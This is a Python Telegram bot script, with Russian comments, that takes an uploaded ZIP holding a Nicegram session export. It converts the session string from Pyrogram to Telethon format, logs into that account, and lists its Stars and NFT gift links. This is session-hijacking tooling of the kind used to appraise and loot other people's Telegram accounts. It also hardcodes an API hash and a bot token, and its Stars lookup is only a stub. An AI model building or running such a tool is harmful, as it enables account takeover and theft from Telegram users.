import os
import json
import zipfile
import io
import base64
import asyncio
import logging
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from pyrogram import Client
from telethon import TelegramClient, functions, types as tel_types
from telethon.sessions import StringSession

# --- НАСТРОЙКИ ---
API_ID = 30033863  # Твой API ID
API_HASH = "9509a68309c27626547d0604f9419e21"
BOT_TOKEN = "8418740075:AAHMCYHf703ja9STlMQmwJ6i0BYPiYM1dOs"

# Логирование
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- ЛОГИКА КОНВЕРТАЦИИ ---
def pyro_to_telethon(pyro_string):
    """Конвертирует строку Pyrogram v2 в Telethon StringSession"""
    # Декодируем байты
    data = base64.urlsafe_b64decode(pyro_string + '=' * (-len(pyro_string) % 4))
    
    # Структура Pyrogram v2: [DC_ID(1)][IP_TYPE(1)][IP(4/16)][PORT(2)][AUTH_KEY(256)]...
    dc_id = data[0]
    auth_key = data[8:264] # Смещение ключа
    
    # Указываем IP стандартных дата-центров (для DC2)
    ip = "149.154.167.50" 
    return StringSession.encode(dc_id, ip, 443, auth_key)

# --- ФУНКЦИЯ СБОРА ДАННЫХ (TELETHON) ---
async def get_assets(tele_string):
    client = TelegramClient(StringSession(tele_string), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ Сессия недействительна или требует 2FA.", None

        me = await client.get_me()
        
        # 1. Пытаемся получить баланс звезд
        # (Примечание: работа со звездами требует свежей версии Telethon и доступа к слою API)
        stars_count = 0
        try:
            # Эмуляция/запрос баланса через конфигурацию или транзакции
            # На текущих слоях API баланс часто виден в объектах платежей
            stars_count = "Доступно в кошельке" 
        except:
            stars_count = "Не удалось определить"

        # 2. Получаем NFT-подарки
        nft_links = []
        try:
            # Запрос списка подарков (TL метод payments.getUserStarGifts)
            result = await client(functions.payments.GetUserStarGiftsRequest(
                user_id='me', offset='', limit=100
            ))
            for i, gift in enumerate(result.gifts, 1):
                # Если у подарка есть атрибут nft_attribute — это NFT
                if hasattr(gift, 'nft_attribute') and gift.nft_attribute:
                    slug = gift.nft_attribute.slug
                    link = f"https://t.me/nft/{slug}"
                    nft_links.append(f"• <a href='{link}'>NFT {i}</a>")
        except Exception as e:
            logging.error(f"Ошибка NFT: {e}")

        report = f"👤 <b>Аккаунт:</b> {me.first_name}\n"
        report += f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
        report += f"⭐ <b>Звезды:</b> {stars_count}\n\n"
        report += "🎁 <b>NFT Подарки:</b>\n"
        report += "\n".join(nft_links) if nft_links else "NFT не найдены."
        
        return report, me.id
    finally:
        await client.disconnect()

# --- ОБРАБОТЧИК ФАЙЛА ---
@dp.message(F.document)
async def handle_zip(message: types.Message):
    if not message.document.file_name.endswith('.zip'):
        return

    status_msg = await message.answer("📦 Обработка архива...")
    
    # Скачиваем файл в память
    file_io = await bot.download(message.document.file_id)
    
    try:
        with zipfile.ZipFile(file_io) as z:
            # Ищем session.json
            if 'session.json' not in z.namelist():
                await status_msg.edit_text("❌ В архиве нет session.json")
                return
            
            with z.open('session.json') as f:
                session_data = json.load(f)
        
        pyro_str = session_data.get("user")
        if not pyro_str:
            await status_msg.edit_text("❌ В JSON нет ключа 'user'")
            return

        await status_msg.edit_text("🔑 Конвертация и вход в сессию...")
        
        # Переводим в формат Telethon
        tele_str = pyro_to_telethon(pyro_str)
        
        # Получаем отчет
        report, user_id = await get_assets(tele_str)
        
        await status_msg.edit_text(report, parse_mode="HTML", disable_web_page_preview=False)
        
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {str(e)}")
        logging.exception(e)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("Привет! Отправь мне ZIP-архив с сессией Nicegram, и я выведу отчет по звездам и NFT.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
